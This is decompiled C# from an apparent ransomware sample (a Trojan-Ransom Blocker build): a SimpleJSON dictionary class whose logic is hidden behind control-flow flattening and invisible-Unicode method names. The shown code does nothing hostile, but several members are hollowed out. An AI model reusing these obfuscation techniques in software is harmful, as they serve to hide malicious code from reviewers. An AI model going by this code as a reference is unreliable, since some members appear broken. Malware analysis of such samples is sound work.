// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONClass
// Assembly: ClaimTyp, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 6CD146E8-0143-4099-A2FD-F452B55D5FF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-200a5cb8bf6489144c66e3b85eaeec5327dc66321001f4c0fda42840d0f230ec.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace SimpleJSON
{
  public class JSONClass : JSONNode, IEnumerable
  {
    private Dictionary<string, JSONNode> m_Dict = new Dictionary<string, JSONNode>();

    public override JSONNode this[string aKey]
    {
      get
      {
label_1:
        int num1 = -1542565509;
        JSONNode jsonNode;
        bool flag;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -955495040)) % 6U)
          {
            case 0:
              goto label_1;
            case 2:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
              num1 = -675897733;
              continue;
            case 3:
              jsonNode = this.m_Dict[aKey];
              num1 = (int) num2 * -1467836537 ^ 1170754716;
              continue;
            case 4:
              int num3 = !flag ? 1239934460 : (num3 = 1756489515);
              num1 = num3 ^ (int) num2 * -219112089;
              continue;
            case 5:
              flag = this.m_Dict.ContainsKey(aKey);
              num1 = (int) num2 * -861232754 ^ 1695371228;
              continue;
            default:
              goto label_7;
          }
        }
label_7:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = 1754095801;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1466252088)) % 7U)
          {
            case 0:
              this.m_Dict[aKey] = value;
              num1 = (int) num2 * -1055063403 ^ 564994358;
              continue;
            case 1:
              this.m_Dict.Add(aKey, value);
              num1 = 1288129633;
              continue;
            case 2:
              goto label_1;
            case 3:
              num1 = (int) num2 * -1647518394 ^ -922974283;
              continue;
            case 4:
              goto label_3;
            case 5:
              int num3 = !this.m_Dict.ContainsKey(aKey) ? -1122702064 : (num3 = -1066395363);
              num1 = num3 ^ (int) num2 * 173022294;
              continue;
            case 6:
              num1 = (int) num2 * 1620726246 ^ 456621509;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public override JSONNode this[int aIndex]
    {
      get
      {
label_1:
        int num1 = 1282577399;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          bool flag;
          int num3;
          switch ((num2 = (uint) (num1 ^ 1517053235)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = !flag ? -809643327 : (num4 = -1578307748);
              num1 = num4 ^ (int) num2 * -1125463648;
              continue;
            case 2:
              jsonNode = (JSONNode) null;
              num1 = 958554309;
              continue;
            case 3:
              num3 = aIndex >= this.m_Dict.Count ? 1 : 0;
              break;
            case 4:
              if (aIndex < 0)
              {
                num3 = 1;
                break;
              }
              num1 = (int) num2 * 1641426220 ^ -3632720;
              continue;
            case 6:
              num1 = (int) num2 * 291861096 ^ -130663210;
              continue;
            case 7:
              jsonNode = (JSONNode) null;
              num1 = (int) num2 * -1917570153 ^ -562776513;
              continue;
            default:
              goto label_12;
          }
          flag = num3 != 0;
          num1 = 861366442;
        }
label_12:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = -1054822119;
        while (true)
        {
          uint num2;
          int num3;
          switch ((num2 = (uint) (num1 ^ -1956823376)) % 5U)
          {
            case 0:
              num1 = (int) num2 * 1186839806 ^ -1252486436;
              continue;
            case 1:
              if (aIndex >= 0)
              {
                num1 = (int) num2 * -1805809219 ^ -1716271861;
                continue;
              }
              num3 = 1;
              break;
            case 2:
              goto label_3;
            case 3:
              num3 = aIndex >= this.m_Dict.Count ? 1 : 0;
              break;
            case 4:
              goto label_1;
            default:
              goto label_10;
          }
          int num4;
          num1 = num4 = num3 == 0 ? -98474786 : (num4 = -223913777);
        }
label_3:
        return;
label_10:;
      }
    }

    public override int Count
    {
      get
      {
label_1:
        int num1 = -1893800895;
        int count;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1532750664)) % 3U)
          {
            case 1:
              count = this.m_Dict.Count;
              num1 = (int) num2 * 148919038 ^ 1048886925;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return count;
      }
    }

    public override void Add(string aKey, JSONNode aItem)
    {
label_1:
      int num1 = 416726145;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1600842275)) % 15U)
        {
          case 0:
            num1 = (int) num2 * 1274497092 ^ 396589764;
            continue;
          case 1:
            this.m_Dict.Add(Guid.NewGuid().ToString(), aItem);
            num1 = 337102492;
            continue;
          case 2:
            num1 = 1713099084;
            continue;
          case 3:
            int num3 = flag2 ? -1662927669 : (num3 = -100910103);
            num1 = num3 ^ (int) num2 * 375057221;
            continue;
          case 4:
            flag2 = this.m_Dict.ContainsKey(aKey);
            num1 = (int) num2 * -1532432473 ^ 190499919;
            continue;
          case 5:
            num1 = (int) num2 * 68412061 ^ 1343504496;
            continue;
          case 6:
            int num4 = !flag1 ? 2093819623 : (num4 = 406558945);
            num1 = num4 ^ (int) num2 * -1803092196;
            continue;
          case 7:
            this.m_Dict[aKey] = aItem;
            num1 = (int) num2 * 701309331 ^ -1849023592;
            continue;
          case 8:
            num1 = (int) num2 * 191477897 ^ 1675565263;
            continue;
          case 9:
            this.m_Dict.Add(aKey, aItem);
            num1 = 1741199229;
            continue;
          case 10:
            num1 = (int) num2 * 1208197233 ^ 2127592327;
            continue;
          case 11:
            num1 = (int) num2 * 489015227 ^ 907862841;
            continue;
          case 12:
            flag1 = !JSONClass.\u200D‮‪‭⁮⁬⁯‪‭​‮⁪‌‪‏⁭‍‪⁭⁯⁮‌‏‫⁫‮⁭⁯‎⁮‌⁫‭‭⁬‫‍⁭⁬‫‮(aKey);
            num1 = (int) num2 * 2070510876 ^ 1347260919;
            continue;
          case 13:
            goto label_1;
          case 14:
            goto label_3;
          default:
            goto label_17;
        }
      }
label_3:
      return;
label_17:;
    }

    public override JSONNode Remove(string aKey)
    {
      bool flag = !this.m_Dict.ContainsKey(aKey);
label_1:
      int num1 = -1663882133;
      JSONNode jsonNode1;
      JSONNode jsonNode2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -975622726)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1929533387 ^ 2053659614;
            continue;
          case 2:
            this.m_Dict.Remove(aKey);
            num1 = (int) num2 * 592870870 ^ 1933084178;
            continue;
          case 3:
            int num3 = !flag ? 2118765934 : (num3 = 2108980466);
            num1 = num3 ^ (int) num2 * 998879153;
            continue;
          case 4:
            jsonNode1 = jsonNode2;
            num1 = (int) num2 * 1793958465 ^ -73816264;
            continue;
          case 5:
            jsonNode1 = (JSONNode) null;
            num1 = (int) num2 * -880953805 ^ -1057263278;
            continue;
          case 6:
            jsonNode2 = this.m_Dict[aKey];
            num1 = -1875832421;
            continue;
          case 8:
            num1 = (int) num2 * -566444113 ^ 1536877275;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return jsonNode1;
    }

    public override JSONNode Remove(int aIndex)
    {
label_1:
      int num1 = 888881727;
      JSONNode jsonNode;
      while (true)
      {
        uint num2;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ 1320891665)) % 8U)
        {
          case 0:
            num3 = aIndex >= this.m_Dict.Count ? 1 : 0;
            break;
          case 1:
            int num4 = !flag ? 1799493904 : (num4 = 94319527);
            num1 = num4 ^ (int) num2 * -1261101164;
            continue;
          case 2:
            jsonNode = (JSONNode) null;
            num1 = (int) num2 * 1733028442 ^ -105267334;
            continue;
          case 4:
            goto label_1;
          case 5:
            jsonNode = (JSONNode) null;
            num1 = 108463970;
            continue;
          case 6:
            if (aIndex >= 0)
            {
              num1 = (int) num2 * 367573190 ^ -736969083;
              continue;
            }
            num3 = 1;
            break;
          case 7:
            num1 = (int) num2 * -491579950 ^ 1682261004;
            continue;
          default:
            goto label_12;
        }
        flag = num3 != 0;
        num1 = 2042129680;
      }
label_12:
      return jsonNode;
    }

    public override JSONNode Remove(JSONNode aNode)
    {
      try
      {
        return (JSONNode) null;
      }
      catch
      {
        return (JSONNode) null;
      }
    }

    public override IEnumerable<JSONNode> Childs
    {
      get
      {
        JSONClass.\u003Cget_Childs\u003Ed__14 childs = new JSONClass.\u003Cget_Childs\u003Ed__14(-2);
label_1:
        int num1 = -1535852568;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2094375567)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              childs.\u003C\u003E4__this = this;
              num1 = (int) num2 * -118145983 ^ -147055798;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return (IEnumerable<JSONNode>) childs;
      }
    }

    public IEnumerator GetEnumerator() => (IEnumerator) new JSONClass.\u003CGetEnumerator\u003Ed__15(0)
    {
      \u003C\u003E4__this = this
    };

    public override string ToString()
    {
      string str = "{";
      Dictionary<string, JSONNode>.Enumerator enumerator = this.m_Dict.GetEnumerator();
      try
      {
label_9:
        int num1 = !enumerator.MoveNext() ? 1928439062 : (num1 = 1427206866);
        KeyValuePair<string, JSONNode> current;
        bool flag;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2039597076)) % 9U)
          {
            case 0:
              num1 = 1427206866;
              continue;
            case 1:
              current = enumerator.Current;
              num1 = 1057195070;
              continue;
            case 2:
              int num3 = flag ? 1016809917 : (num3 = 1677873175);
              num1 = num3 ^ (int) num2 * 1184469315;
              continue;
            case 3:
              num1 = (int) num2 * 575971737 ^ 823503427;
              continue;
            case 4:
              goto label_9;
            case 6:
              str = JSONClass.\u202A‭‌⁫⁪⁮⁪⁪⁬‍‭‫​‭‌⁯‍‭‪⁮‮⁬‏‏‭⁯⁭‮‏‪‫⁬‌‬‮​⁯‭‫‭‮(new string[5]
              {
                str,
                "\"",
                JSONNode.Escape(current.Key),
                "\":",
                JSONClass.\u202D‭‍⁯‌‌⁭‬⁫⁬‍‍‏‌⁬⁬⁭‫‬‪⁮‌⁯‎‏​‎‏‮⁮⁭⁪‬‪⁪⁮⁪⁮⁮‭‮((object) current.Value)
              });
              num1 = 169701657;
              continue;
            case 7:
              flag = JSONClass.\u206D​⁯‭‌‏‮‪‬‪‪⁯‮⁮‌⁯⁬⁯‫‎⁭‬‍‏‌‪‌‭‎⁪‌⁯‌‫⁭‪‪‏⁫‬‮(str) > 2;
              num1 = (int) num2 * -327908936 ^ -1889015877;
              continue;
            case 8:
              str = JSONClass.\u206B‫‏‮⁬‫​⁮⁮​⁪⁪⁮⁬⁮‮‪‭⁬‍‭⁭⁬‭‫‎⁯‍⁯‌‪‌​‬​‭⁮‮‬‎‮(str, ", ");
              num1 = (int) num2 * -745868449 ^ -956743994;
              continue;
            default:
              goto label_16;
          }
        }
      }
      finally
      {
        enumerator.Dispose();
label_12:
        int num4 = 1949844509;
        while (true)
        {
          uint num5;
          switch ((num5 = (uint) (num4 ^ 2039597076)) % 3U)
          {
            case 0:
              goto label_12;
            case 1:
              num4 = (int) num5 * -1225656456 ^ 1688261617;
              continue;
            default:
              goto label_15;
          }
        }
label_15:;
      }
label_16:
      return JSONClass.\u206B‫‏‮⁬‫​⁮⁮​⁪⁪⁮⁬⁮‮‪‭⁬‍‭⁭⁬‭‫‎⁯‍⁯‌‪‌​‬​‭⁮‮‬‎‮(str, "}");
    }

    public override string ToString(string aPrefix)
    {
      string str1 = "{ ";
      using (Dictionary<string, JSONNode>.Enumerator enumerator = this.m_Dict.GetEnumerator())
      {
label_9:
        int num1 = !enumerator.MoveNext() ? -725671182 : (num1 = -1685706557);
        KeyValuePair<string, JSONNode> current;
        bool flag;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -757515954)) % 9U)
          {
            case 0:
              goto label_9;
            case 1:
              int num3 = !flag ? -721595618 : (num3 = -1152127419);
              num1 = num3 ^ (int) num2 * 446967512;
              continue;
            case 2:
              current = enumerator.Current;
              num1 = -1919480208;
              continue;
            case 3:
              str1 = JSONClass.\u206B‫‏‮⁬‫​⁮⁮​⁪⁪⁮⁬⁮‮‪‭⁬‍‭⁭⁬‭‫‎⁯‍⁯‌‪‌​‬​‭⁮‮‬‎‮(str1, ", ");
              num1 = (int) num2 * -1764072631 ^ -134804035;
              continue;
            case 4:
              flag = JSONClass.\u206D​⁯‭‌‏‮‪‬‪‪⁯‮⁮‌⁯⁬⁯‫‎⁭‬‍‏‌‪‌‭‎⁪‌⁯‌‫⁭‪‪‏⁫‬‮(str1) > 3;
              num1 = (int) num2 * 526390631 ^ -1545319089;
              continue;
            case 5:
              num1 = (int) num2 * -82375207 ^ 1869949625;
              continue;
            case 6:
              str1 = JSONClass.\u206A‭‫‭⁯⁫‪‍⁫‫⁯⁯‬‬⁭‌⁯⁫‮‬⁯⁪⁯​‭‬⁪⁪⁪‫‪‪‮⁯‌‬‬‏‭‏‮(str1, "\n", aPrefix, "   ");
              str1 = JSONClass.\u202A‭‌⁫⁪⁮⁪⁪⁬‍‭‫​‭‌⁯‍‭‪⁮‮⁬‏‏‭⁯⁭‮‏‪‫⁬‌‬‮​⁯‭‫‭‮(new string[5]
              {
                str1,
                "\"",
                JSONNode.Escape(current.Key),
                "\" : ",
                current.Value.ToString(JSONClass.\u206B‫‏‮⁬‫​⁮⁮​⁪⁪⁮⁬⁮‮‪‭⁬‍‭⁭⁬‭‫‎⁯‍⁯‌‪‌​‬​‭⁮‮‬‎‮(aPrefix, "   "))
              });
              num1 = -873898317;
              continue;
            case 7:
              num1 = -1685706557;
              continue;
            default:
              goto label_12;
          }
        }
      }
label_12:
      string str2 = JSONClass.\u206A‭‫‭⁯⁫‪‍⁫‫⁯⁯‬‬⁭‌⁯⁫‮‬⁯⁪⁯​‭‬⁪⁪⁪‫‪‪‮⁯‌‬‬‏‭‏‮(str1, "\n", aPrefix, "}");
label_13:
      int num4 = -773615854;
      while (true)
      {
        uint num5;
        switch ((num5 = (uint) (num4 ^ -757515954)) % 3U)
        {
          case 0:
            goto label_13;
          case 2:
            num4 = (int) num5 * -569135203 ^ -1538311736;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public override void Serialize(BinaryWriter aWriter)
    {
label_1:
      int num1 = -494050248;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1085558099)) % 4U)
        {
          case 0:
            JSONClass.\u206A⁯‮‮‬‎‬⁯⁫‍‮⁯‭‌‪⁭‏‬‎‍‏‫‮⁪⁬⁭​‫‭​‌⁪⁫‮⁬​⁫⁫‫‪‮(aWriter, this.m_Dict.Count);
            num1 = (int) num2 * -640704979 ^ -2120748785;
            continue;
          case 1:
            JSONClass.\u206A‍‫⁮⁫‮‌⁫⁫⁮‏‮‌‍‫‮⁮⁭⁬‬‍​‬⁭‪‫‎‍‌‫‬⁪‫‪⁫‍⁫‏‎‍‮(aWriter, (byte) 2);
            num1 = (int) num2 * -648608185 ^ 526012210;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      using (Dictionary<string, JSONNode>.KeyCollection.Enumerator enumerator = this.m_Dict.Keys.GetEnumerator())
      {
label_11:
        int num3 = !enumerator.MoveNext() ? -1929600925 : (num3 = -1569970025);
        string current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num3 ^ -1085558099)) % 7U)
          {
            case 0:
              JSONClass.\u206C‮⁪⁬‪⁫​‫‮‮‍⁫⁫‎⁬‮⁯​‬‎‎‌‏‏⁫⁮⁬‮‫⁯⁮⁭‍⁯⁬‪‏‮‫⁫‮(aWriter, current);
              num3 = (int) num4 * -1257769945 ^ 1416919693;
              continue;
            case 1:
              goto label_11;
            case 2:
              goto label_15;
            case 3:
              num3 = -1569970025;
              continue;
            case 4:
              current = enumerator.Current;
              num3 = -723032862;
              continue;
            case 5:
              num3 = (int) num4 * -767886764 ^ -1099700028;
              continue;
            case 6:
              this.m_Dict[current].Serialize(aWriter);
              num3 = (int) num4 * -927391199 ^ -218452842;
              continue;
            default:
              goto label_9;
          }
        }
label_15:
        return;
label_9:;
      }
    }

    public JSONClass()
    {
label_1:
      int num1 = 800447142;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 597935709)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -631728077 ^ 589162335;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    static bool \u200D‮‪‭⁮⁬⁯‪‭​‮⁪‌‪‏⁭‍‪⁭⁯⁮‌‏‫⁫‮⁭⁯‎⁮‌⁫‭‭⁬‫‍⁭⁬‫‮([In] string obj0) => string.IsNullOrEmpty(obj0);

    static int \u206D​⁯‭‌‏‮‪‬‪‪⁯‮⁮‌⁯⁬⁯‫‎⁭‬‍‏‌‪‌‭‎⁪‌⁯‌‫⁭‪‪‏⁫‬‮([In] string obj0) => obj0.Length;

    static string \u206B‫‏‮⁬‫​⁮⁮​⁪⁪⁮⁬⁮‮‪‭⁬‍‭⁭⁬‭‫‎⁯‍⁯‌‪‌​‬​‭⁮‮‬‎‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u202D‭‍⁯‌‌⁭‬⁫⁬‍‍‏‌⁬⁬⁭‫‬‪⁮‌⁯‎‏​‎‏‮⁮⁭⁪‬‪⁪⁮⁪⁮⁮‭‮([In] object obj0) => obj0.ToString();

    static string \u202A‭‌⁫⁪⁮⁪⁪⁬‍‭‫​‭‌⁯‍‭‪⁮‮⁬‏‏‭⁯⁭‮‏‪‫⁬‌‬‮​⁯‭‫‭‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206A‭‫‭⁯⁫‪‍⁫‫⁯⁯‬‬⁭‌⁯⁫‮‬⁯⁪⁯​‭‬⁪⁪⁪‫‪‪‮⁯‌‬‬‏‭‏‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3)
    {
      return obj0 + obj1 + obj2 + obj3;
    }

    static void \u206A‍‫⁮⁫‮‌⁫⁫⁮‏‮‌‍‫‮⁮⁭⁬‬‍​‬⁭‪‫‎‍‌‫‬⁪‫‪⁫‍⁫‏‎‍‮([In] BinaryWriter obj0, [In] byte obj1) => obj0.Write(obj1);

    static void \u206A⁯‮‮‬‎‬⁯⁫‍‮⁯‭‌‪⁭‏‬‎‍‏‫‮⁪⁬⁭​‫‭​‌⁪⁫‮⁬​⁫⁫‫‪‮([In] BinaryWriter obj0, [In] int obj1) => obj0.Write(obj1);

    static void \u206C‮⁪⁬‪⁫​‫‮‮‍⁫⁫‎⁬‮⁯​‬‎‎‌‏‏⁫⁮⁬‮‫⁯⁮⁭‍⁯⁬‪‏‮‫⁫‮([In] BinaryWriter obj0, [In] string obj1) => obj0.Write(obj1);
  }
}
